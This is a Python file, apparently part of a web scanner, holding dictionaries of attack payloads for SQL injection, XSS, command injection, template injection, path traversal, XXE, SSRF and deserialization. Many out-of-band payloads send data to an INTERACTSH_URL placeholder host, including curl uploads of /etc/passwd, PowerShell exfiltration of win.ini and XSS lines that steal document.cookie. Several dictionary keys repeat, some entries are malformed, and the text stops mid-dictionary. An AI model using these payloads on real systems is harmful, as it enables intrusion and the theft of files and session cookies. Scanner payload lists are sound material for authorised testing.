# Payloads for various web vulnerabilities
# Categories help in selecting appropriate tests

# --- SQL Injection Payloads ---
SQLI_PAYLOADS = {
    "error_based": [
        "' AND 1=CAST((SELECT SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),1,1024)) AS INT)--", # MySQL Table Extraction
        "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT CONCAT_WS(0x3a,USER(),DATABASE(),VERSION()) FROM dual)))--", # MySQL XPath Abuse
        "' AND 1=UPDATEXML(NULL,CONCAT(0x3a,(SELECT @@version)),1)--", # MySQL XML Corruption
        "' AND 1=(SELECT * FROM (SELECT(X)FROM(SELECT(X)FROM(SELECT(X)FROM(SELECT 1/(LENGTH(@@version)-LENGTH(@@version)+1)X)X)X)X))--", # Nested Division Trick
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(58),VERSION(),CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)--", # MySQL Error with Randomization
    ],
    "blind_time": [
        "' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0,BENCHMARK(5000000,SHA1(1)),0)--", # MySQL Benchmark Delay
        "' AND IF(1=1,RLIKE(SELECT CONCAT(CHAR(65),REPEAT(CHAR(66),1000000))),0)--", # MySQL Regex Overload
        "'; DECLARE @x INT; SET @x=1; WHILE @x<10000000 BEGIN SET @x=@x+1 END--", # MSSQL Loop Delay
        "' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE NULL END)--", # PostgreSQL Conditional Sleep
        "' AND DBMS_UTILITY.WAIT_ON_PENDING_DML('nonexistent',CAST(5 AS NUMBER))--", # Oracle Wait Trick
    ],
    "blind_boolean": [
        "' AND EXISTS(SELECT 1 WHERE SUBSTRING((SELECT DATABASE()),1,1)=CHAR(97))--", # MySQL Char Comparison
        "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME REGEXP BINARY '^u')>0--", # MySQL Regex Table Check
        "' AND 1=(CASE WHEN (SELECT SUBSTRING(@@version,1,1))='5' THEN 1 ELSE 0 END)--", # MSSQL Version Check
        "' AND (SELECT LENGTH(CAST(CURRENT_USER AS TEXT)))=LENGTH(CURRENT_USER)--", # PostgreSQL Type Casting
    ],
    "union_based": [
        "' UNION ALL SELECT NULL,CONCAT(CHAR(58),HEX(UNHEX(@@version)),CHAR(58)),NULL--", # MySQL Hex Encoded Version
        "' UNION SELECT (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()),NULL,NULL--", # MySQL Table Dump
        "' UNION SELECT NULL,(SELECT UTL_INADDR.GET_HOST_NAME('localhost') FROM DUAL),NULL--", # Oracle Hostname
    ],
    "oob": [
        "' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX(CONCAT(DATABASE(),0x2e,'INTERACTSH_URL'))),'.INTERACTSH_URL\\x')))--", # MySQL UNC Hex Encoded
        "'; EXEC master.dbo.xp_fileexist '\\\\INTERACTSH_URL\\test.txt'--", # MSSQL File Existence OOB
        "' UNION SELECT (SELECT CHR(65)||UTL_HTTP.REQUEST('http://INTERACTSH_URL/'||USER)) FROM DUAL--", # Oracle HTTP with Concat
    ],
    "waf_evasion": [
        "'/**/UNION/**/ALL/**/SELECT/**/NULL,@@version,NULL--", # MySQL Inline Comments
        "'%0bOR%0bASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--", # Vertical Tab Obfuscation
        "'+UNION+ALL+SELECT+NULL,CONCAT(CHAR(58),CAST(VERSION()+AS+CHAR),CHAR(58)),NULL--", # URL Encoded Spaces
        "'/*!50000AND*/(SELECT*FROM(SELECT(SLEEP(0)))a)--", # MySQL Versioned Comment with Subquery
        "' OR 1=CAST(HEX(UNHEX('31')) AS INT)--", # Hex Encoded '1'
    ]
}

# --- Cross-Site Scripting (XSS) Payloads ---
XSS_PAYLOADS = {
    "attribute_injection": [
        "\" onfocus=eval(atob('YWxlcnQoMSk=')) autofocus tabindex=0 \"", # Base64 Eval in Attribute
        "\" style=animation:1s;animation-name:x; onanimationend=alert(1) \"", # CSS Animation Trigger
        "\" accesskey=x onclick=alert(1) \"", # Accesskey Abuse
    ],
    "filter_evasion": [
        "<svg><script>alert&#x28;1&#x29;</script></svg>", # HTML Entities Obfuscation
        "<img src=x onerror=Function('ale'+'rt(1)')()>", # String Concatenation
        "<meta content=\"1;javascript:alert(1)\" http-equiv=\"refresh\">", # Meta Refresh Trick
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", # Base64 Data URI
        "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>", # Srcdoc Injection
    ],
    "dom_based": [
        "javascript:void(document.documentElement.innerHTML='<img src=x onerror=alert(1)>')", # DOM Rewrite
        "javascript:window.name='alert(1)';eval(window.name)", # Window Name Abuse
        "data:,eval(atob(location.hash.slice(1)))#YWxlcnQoMSk=", # Data URI with Hash
    ],
    "polyglots": [
        "javascript:/*--></title></style></textarea><svg/onload=Function('ale'+'rt(1)')()>", # Multi-Context with Concat
        "\"'><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", # Charcode Eval
        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+", # Base64 Polyglot
    ]
}

CMD_PAYLOADS = {
    "blind_time": [
        "; for i in {1..1000000}; do :; done", # Linux Loop Delay
        "& powershell -nop -c \"1..1000000 | % {}\"", # Windows PowerShell Loop
        "$(perl -e 'select(undef,undef,undef,0.5)')", # Perl Sleep
        "; bash -c 'echo $((1+1)) | sleep 5'", # Bash Arithmetic Delay
    ],
    "oob": [
        "; curl --data \"$(base64 /etc/passwd)\" http://INTERACTSH_URL/", # Linux Base64 Exfil
        "& powershell IWR -Uri http://INTERACTSH_URL/ -Method POST -Body ([Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\win.ini')))", # Windows Base64 Exfil
        "$(wget -qO- http://INTERACTSH_URL/`openssl rand -hex 8`)", # Random Hex OOB
    ],
    "filter_evasion": [
        "; ${PATH//:/\/bin\/}id", # PATH Manipulation
        "& cmd /c \"set a=who&&set b=ami&&%a%%b%\"", # Windows Variable Concat
        "; eval \"`echo aWQ=|base64 -d`\"", # Base64 Command Decode
        "$(printf '%s\n' 'i' 'd' | tr -d '\n' | sh)", # Printf Command Build
    ]
}
# --- Server-Side Template Injection (SSTI) Payloads ---
SSTI_PAYLOADS = {
    "jinja2": [
        # Payload for SSTI in Jinja2 with sandbox bypass
        "{{ get_flashed_messages.__globals__['__builtins__'].eval('__import__(\'os\').popen(\'id\').read()') }}", 
        # This payload uses the built-in `eval` function to execute OS commands
        "{{ ''.__class__.__mro__[1].__subclasses__()[183].__init__.__globals__['sys'].modules['os'].system('id') }}",
        # This payload accesses the `os` module through the class hierarchy to execute commands
    ],
    "freemarker": [
        # Example payload for Freemarker (add more as needed)
        "<#assign x='freemarker.template.utility.Execute'?new()>${x('nslookup INTERACTSH_URL')}", # DNS OOB
    ],
    "ruby_erb": [
        "<%= IO.popen('curl http://INTERACTSH_URL/`whoami`').readlines.join %>", # OOB HTTP
    ],
    "thymeleaf": [
        "[[${T(java.lang.Runtime).getRuntime().exec('nslookup INTERACTSH_URL').waitFor()?'':''}]]", # DNS OOB
    ]
}

# --- Path Traversal Payloads ---

PATH_TRAVERSAL_PAYLOADS = {
    "encoding_bypass": [
        "..%252f..%252fetc%252fpasswd", # Double URL Encoding
        "..%c0%ae%c0%ae..%c0%ae%c0%aeetc/passwd", # Overlong UTF-8 Dot
        "%252e%252e%255c%252e%252e%255cwindows%255cwin.ini", # Double Encoded Windows
    ],
    "wrapper_bypass": [
        "php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=../../../../etc/passwd", # Encoding Trick
        "expect://whoami", # Expect Wrapper (if enabled)
        "data://text/plain;base64,Li4vLi4vZXRjL3Bhc3N3ZA==", # Base64 Data URI
    ],
    "unicode": [
        "..%c0%af",  # Carácter Unicode para /
        "..%252f",   # Codificación doble
    ],
    "null_byte": [
        "../../../../etc/passwd%00",
        "..;/etc/passwd%00",  # Combinación de ; y null byte
    ],
} 

# --- Out-of-Band (OOB) Payloads ---
OOB_PAYLOADS = {
    "php": [
        # DNS
        "<?php system('nslookup INTERACTSH_URL'); ?>",
        "<?php exec('dig INTERACTSH_URL'); ?>",
        "<?php shell_exec('host INTERACTSH_URL'); ?>",
        
        # HTTP/HTTPS
        "<?php file_get_contents('http://INTERACTSH_URL/whoami'); ?>",
        "<?php curl_exec(curl_init('http://INTERACTSH_URL/whoami')); ?>",
        "<?php system('curl http://INTERACTSH_URL/whoami'); ?>",
        "<?php exec('wget -qO- http://INTERACTSH_URL/whoami'); ?>",
        "<?php shell_exec('curl -s http://INTERACTSH_URL/whoami'); ?>",
        "<?php `curl http://INTERACTSH_URL/whoami`; ?>",
        
        # POST data
        "<?php $ch=curl_init(); curl_setopt($ch,CURLOPT_URL,'http://INTERACTSH_URL'); curl_setopt($ch,CURLOPT_POST,1); curl_setopt($ch,CURLOPT_POSTFIELDS,'data='.shell_exec('whoami')); curl_exec($ch); ?>",
        
        # File upload
        "<?php $ch=curl_init(); $fp=fopen('php://temp','w+'); fwrite($fp,shell_exec('whoami')); rewind($fp); curl_setopt($ch,CURLOPT_URL,'http://INTERACTSH_URL'); curl_setopt($ch,CURLOPT_INFILE,$fp); curl_setopt($ch,CURLOPT_INFILESIZE,filesize('php://temp')); curl_exec($ch); ?>",
        
        # SMB
        "<?php system('smbclient -c 'whoami' //INTERACTSH_URL/share'); ?>",
        
        # LDAP
        "<?php ldap_connect('ldap://INTERACTSH_URL:389'); ?>",
        
        # JNDI
        "<?php $jndi = 'ldap://INTERACTSH_URL:1389/Basic/Command/whoami'; ?>",
        
        # XXE
        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % remote SYSTEM 'http://INTERACTSH_URL/whoami'>%remote;]>",
        
        # SSRF
        "<?php file_get_contents('http://INTERACTSH_URL/whoami'); ?>",
        
        # Deserialization
        "<?php unserialize('O:8:\"stdClass\":1:{s:4:\"data\";s:10:\"whoami\";}'); ?>",
        
        # Template injection
        "<?php echo '{{7*7}}'; ?>",
        
        # Log injection
        "<?php error_log('whoami', 0); ?>",
        
        # Command injection
        "<?php system('whoami'); ?>",
        "<?php exec('whoami'); ?>",
        "<?php shell_exec('whoami'); ?>",
        "<?php passthru('whoami'); ?>",
        "<?php `whoami`; ?>",
        
        # SQL injection
        "<?php mysql_query('SELECT LOAD_FILE(CONCAT(\"\\\\\",INTERACTSH_URL,\"\\\\\",whoami))'); ?>",
        
        # XSS
        "<?php echo '<script>fetch(\"http://INTERACTSH_URL/whoami\")</script>'; ?>"
    ],
    "dns": [
        "nslookup `whoami`.INTERACTSH_URL",
        "dig `whoami`.INTERACTSH_URL",
        "dig +short `whoami`.`hostname`.INTERACTSH_URL", # Multi-Level DNS
        "host `whoami`.INTERACTSH_URL",
        "ping -c 1 `whoami`.INTERACTSH_URL",
        "curl -v `whoami`.INTERACTSH_URL",
        "wget -q -O- `whoami`.INTERACTSH_URL",
        "python -c 'import socket; socket.gethostbyname(\"`whoami`.INTERACTSH_URL\")'",
        "perl -e 'use Socket; gethostbyname(\"`whoami`.INTERACTSH_URL\");'",
        "ruby -e 'require \"socket\"; Socket.gethostbyname(\"`whoami`.INTERACTSH_URL\")'",
        "php -r 'dns_get_record(\"`whoami`.INTERACTSH_URL\",DNS_A);'", # PHP DNS Lookup
        "php -r 'gethostbyname(\"`whoami`.INTERACTSH_URL\");'",
    ],
    "http": [
        "curl http://INTERACTSH_URL/`whoami`",
        "curl -H \"X-Data: $(base64 /etc/passwd)\" http://INTERACTSH_URL/", # Header Exfil
        "wget -q -O- http://INTERACTSH_URL/`whoami`",
        "python -c 'import urllib.request; urllib.request.urlopen(\"http://INTERACTSH_URL/`whoami`\")'",
        "perl -e 'use LWP::Simple; get(\"http://INTERACTSH_URL/`whoami`\");'",
        "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"http://INTERACTSH_URL/`whoami`\"))'",
        "php -r 'file_get_contents(\"http://INTERACTSH_URL/`whoami`\");'",
        "powershell -Command \"(New-Object System.Net.WebClient).DownloadString('http://INTERACTSH_URL/'+$env:username)\"",
        "powershell -c \"IWR -Uri http://INTERACTSH_URL/ -Body ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((gc 'C:\\Windows\\win.ini' -Raw))))\"", # PowerShell UTF8 Exfil
        "certutil -urlcache -split -f http://INTERACTSH_URL/`whoami`",
    ],
    "https": [
        "curl https://INTERACTSH_URL/`whoami`",
        "wget -q -O- https://INTERACTSH_URL/`whoami`",
        "python -c 'import urllib.request; urllib.request.urlopen(\"https://INTERACTSH_URL/`whoami`\")'",
        "perl -e 'use LWP::Simple; get(\"https://INTERACTSH_URL/`whoami`\");'",
        "ruby -e 'require \"net/http\"; Net::HTTP.get(URI(\"https://INTERACTSH_URL/`whoami`\"))'",
        "php -r 'file_get_contents(\"https://INTERACTSH_URL/`whoami`\");'",
        "powershell -Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadString('https://INTERACTSH_URL/'+$env:username)\"",
    ],
    "post_data": [
        "curl -X POST -d \"output=$(id | base64)\" http://INTERACTSH_URL/",
        "wget --post-data=\"output=$(id | base64)\" http://INTERACTSH_URL/",
        "python -c 'import urllib.request, urllib.parse; data = urllib.parse.urlencode({\"output\": \"$(id | base64)\"}); urllib.request.urlopen(\"http://INTERACTSH_URL/\", data.encode())'",
        "perl -e 'use LWP::UserAgent; my $ua = LWP::UserAgent->new(); $ua->post(\"http://INTERACTSH_URL/\", {output => qx(id | base64)});'",
        "ruby -e 'require \"net/http\"; uri = URI(\"http://INTERACTSH_URL/\"); Net::HTTP.post_form(uri, {\"output\" => %x(id | base64)})'",
        "php -r 'file_get_contents(\"http://INTERACTSH_URL/\", false, stream_context_create([\"http\" => [\"method\" => \"POST\", \"content\" => \"output=\".base64_encode(shell_exec(\"id\"))]]));'",
        "powershell -Command \"$output = (id | base64); $body = @{output=$output} | ConvertTo-Json; Invoke-RestMethod -Uri 'http://INTERACTSH_URL/' -Method Post -Body $body\"",
    ],
    "file_upload": [
        "curl -F 'file=@/etc/passwd' http://INTERACTSH_URL/",
        "wget --post-file=/etc/passwd http://INTERACTSH_URL/",
        "python -c 'import requests; files = {\"file\": open(\"/etc/passwd\", \"rb\")}; requests.post(\"http://INTERACTSH_URL/\", files=files)'",
        "perl -e 'use LWP::UserAgent; my $ua = LWP::UserAgent->new(); $ua->post(\"http://INTERACTSH_URL/\", Content_Type => \"form-data\", Content => [file => [\"/etc/passwd\"]]);'",
        "ruby -e 'require \"net/http\"; uri = URI(\"http://INTERACTSH_URL/\"); Net::HTTP.post_form(uri, {\"file\" => File.open(\"/etc/passwd\")})'",
        "php -r '$ch = curl_init(\"http://INTERACTSH_URL/\"); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, [\"file\" => new CURLFile(\"/etc/passwd\")]); curl_exec($ch);'",
        "powershell -Command \"$file = Get-Content '/etc/passwd' -Raw; $body = @{file = $file} | ConvertTo-Json; Invoke-RestMethod -Uri 'http://INTERACTSH_URL/' -Method Post -Body $body\"",
    ],
    "smb": [
        "smbclient -L //INTERACTSH_URL/",
        "smbmap -H INTERACTSH_URL",
        "rpcclient INTERACTSH_URL",
        "enum4linux INTERACTSH_URL",
        "nmap -p445 --script smb-* INTERACTSH_URL",
    ],
    "ldap": [
        "ldapsearch -x -H ldap://INTERACTSH_URL",
        "ldapsearch -x -H ldaps://INTERACTSH_URL",
        "ldapsearch -x -H ldapi://INTERACTSH_URL",
        "ldapsearch -x -H ldap://INTERACTSH_URL -b \"dc=example,dc=com\"",
    ],
    "jndi": [
        "${jndi:ldap://INTERACTSH_URL/exploit}",
        "${jndi:rmi://INTERACTSH_URL/exploit}",
        "${jndi:dns://INTERACTSH_URL/exploit}",
        "${jndi:iiop://INTERACTSH_URL/exploit}",
        "${jndi:corba://INTERACTSH_URL/exploit}",
        "${jndi:nis://INTERACTSH_URL/exploit}",
    ],
    "xxe": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % p SYSTEM \"http://INTERACTSH_URL/\"><!ENTITY % q \"<!ENTITY r '%p;'>\">%q;]><x>&r;</x>", # Nested Entity OOB
    ],
    "ssrf": [
        "http://INTERACTSH_URL/",
        "https://INTERACTSH_URL/",
        "file:///etc/passwd",
        "dict://INTERACTSH_URL/",
        "gopher://INTERACTSH_URL/",
        "ldap://INTERACTSH_URL/",
        "sftp://INTERACTSH_URL/",
        "tftp://INTERACTSH_URL/",
        "telnet://INTERACTSH_URL/",
        "redis://INTERACTSH_URL/",
        "mongodb://INTERACTSH_URL/",
        "mysql://INTERACTSH_URL/",
        "postgresql://INTERACTSH_URL/",
        "mssql://INTERACTSH_URL/",
        "oracle://INTERACTSH_URL/",
    ],
    "deserialization": [
        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwAAWgABaQABMl0ABWFycmF5dAAJTGphdmEvbGFuZy9PYmplY3Q7eHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQALawM7CgABA1lAAAJbAAKdAA7TGphdmEvdXRpbC9IYXNoTWFwJEVudHJ5O3hwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcEVudHJ5VjJxbqzl0BSIAAAABwAAAAABcQB+AAZ0AAJpZHQAAXZ0AAJ2YWx0AAJ2MXQAAXZ0AAJ2YWx0AAJ2MnQAAXZ0AAJ2YWx0AAJ2M3QAAXZ0AAJ2YWx0AAJ2NHQAAXZ0AAJ2YWx0AAJ2NXQAAXZ0AAJ2YWx0AAJ2NnQAAXZ0AAJ2YWx0AAJ2N3QAAXZ0AAJ2YWx0AAJ2OHQAAXZ0AAJ2YWx0AAJ2OXQAAXZ0AAJ2YWx0AAJ2MTB0AAJ2YWx0AAJ2MTF0AAJ2YWx0AAJ2MTJ0AAJ2YWx0AAJ2MTN0AAJ2YWx0AAJ2MTQ=",
        "a:2:{i:0;s:4:\"test\";i:1;s:4:\"test\";}",
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
        "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\\0\\0\\0event\";O:15:\"Faker\\Generator\":1:{s:13:\"\\0\\0\\0formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"\\0\\0\\0data\";s:2:\"id\";}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
    ],
    "template_injection": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "${config}",
        "<%= config %>",
        "#{config}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "${''.__class__.__mro__[1].__subclasses__()}",
        "<%= ''.class.mro[1].subclasses %>",
        "#{''.class.mro[1].subclasses}",
        "{{''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}}",
        "${''.__class__.__mro__[1].__subclasses__()[401](['id'], stdout=-1).communicate()[0].strip()}",
        "<%= ''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip %>",
        "#{''.class.mro[1].subclasses[401](['id'], stdout=-1).communicate[0].strip}",
    ],
    "log_injection": [
        "<?php system('id'); ?>",
        "<?php echo shell_exec('id'); ?>",
        "<?php passthru('id'); ?>",
        "<?php exec('id'); ?>",
        "<?php `id`; ?>",
        "<?php system('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php echo shell_exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php passthru('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php exec('curl http://INTERACTSH_URL/$(whoami)'); ?>",
        "<?php `curl http://INTERACTSH_URL/$(whoami)`; ?>",
    ],
    "command_injection": [
        "`id`",
        "$(id)",
        "; id",
        "& id",
        "| id",
        "&& id",
        "|| id",
        "`curl http://INTERACTSH_URL/`whoami``",
        "$(curl http://INTERACTSH_URL/`whoami`)",
        "; curl http://INTERACTSH_URL/`whoami`",
        "& curl http://INTERACTSH_URL/`whoami`",
        "| curl http://INTERACTSH_URL/`whoami`",
        "&& curl http://INTERACTSH_URL/`whoami`",
        "|| curl http://INTERACTSH_URL/`whoami`",
    ],
    "sql_injection": [
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT UNHEX(HEX(@@HOSTNAME))), '.INTERACTSH_URL\\\\', 'abc'))--",
        "' UNION SELECT UTL_HTTP.REQUEST('http://INTERACTSH_URL') FROM DUAL--",
        "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL') FROM DUAL--",
        "COPY (SELECT '') TO PROGRAM 'nslookup INTERACTSH_URL'--",
        "' UNION SELECT pg_sleep(1), pg_read_file('http://INTERACTSH_URL/')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/passwd')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/shadow')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/hosts')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/issue')--",
        "' UNION SELECT pg_sleep(1), pg_read_file('file:///etc/motd')--",
    ],
    "xss": [
        "<img src=x onerror=\"fetch('http://INTERACTSH_URL/'+document.cookie)\">",
        "<img src=x onerror=\"new Image().src='http://INTERACTSH_URL/'+document.cookie\">",
        "<img src=x onerror=\"var x=new XMLHttpRequest();x.open('GET','http://INTERACTSH_URL/'+document.cookie);x.send();\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+document.cookie;\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+btoa(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location);\">",
        "<img src=x onerror=\"var x=new Image();x.src='http://INTERACTSH_URL/'+encodeURIComponent(document.domain+':'+document.cookie+':'+document.location+':'+document.referrer);\">",
    ],
    "xxe": [
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=config.php\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=.env\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://INTERACTSH_URL/`whoami`\">]><foo>&xxe;</foo>",
    ],
    "ssrf": [
        "http://INTERACTSH_URL/",
        "https://INTERACTSH_URL/",
        "file:///etc/passwd",
        "dict://INTERACTSH_URL/",
        "gopher://INTERACTSH_URL/",
        "ldap://INTERACTSH_URL/",
        "sftp://INTERACTSH_URL/",
        "tftp://INTERACTSH_URL/",
        "telnet://INTERACTSH_URL/",
        "redis://INTERACTSH_URL/",
        "mongodb://INTERACTSH_URL/",
        "mysql://INTERACTSH_URL/",
        "postgresql://INTERACTSH_URL/",
        "mssql://INTERACTSH_URL/",
        "oracle://INTERACTSH_URL/",
    ],
    "deserialization": [
        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwAAWgABaQABMl0ABWFycmF5dAAJTGphdmEvbGFuZy9PYmplY3Q7eHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQALawM7CgABA1lAAAJbAAKdAA7TGphdmEvdXRpbC9IYXNoTWFwJEVudHJ5O3hwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcEVudHJ5VjJxbqzl0BSIAAAABwAAAAABcQB+AAZ0AAJpZHQAAXZ0AAJ2YWx0AAJ2MXQAAXZ0AAJ2YWx0AAJ2MnQAAXZ0AAJ2YWx0AAJ2M3QAAXZ0AAJ2YWx0AAJ2NHQAAXZ0AAJ2YWx0AAJ2NXQAAXZ0AAJ2YWx0AAJ2NnQAAXZ0AAJ2YWx0AAJ2N3QAAXZ0AAJ2YWx0AAJ2OHQAAXZ0AAJ2YWx0AAJ2OXQAAXZ0AAJ2YWx0AAJ2MTB0AAJ2YWx0AAJ2MTF0AAJ2YWx0AAJ2MTJ0AAJ2YWx0AAJ2MTN0AAJ2YWx0AAJ2MTQ=",
        "a:2:{i:0;s:4:\"test\";i:1;s:4:\"test\";}",
        "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
        "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"\\0\\0\\0event\";O:15:\"Faker\\Generator\":1:{s:13:\"\\0\\0\\0formatters\";a:1:{s:8:\"dispatch\";s:6:\"system\";}}s:8:\"\\0\\0\\0data\";s:2:\"id\";}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:6:\"system\";}}}",
        "O:29:\"Illuminate\\Support\\MessageBag\":1:{s:9:\"\\0\\0\\0messages\";a:1:{s:4:\"test\";a:1:{i:0;s:2:\"id\";}}}",
    ],
    "template_injection": [
        "{{7*7}}",
        "${7*7}",
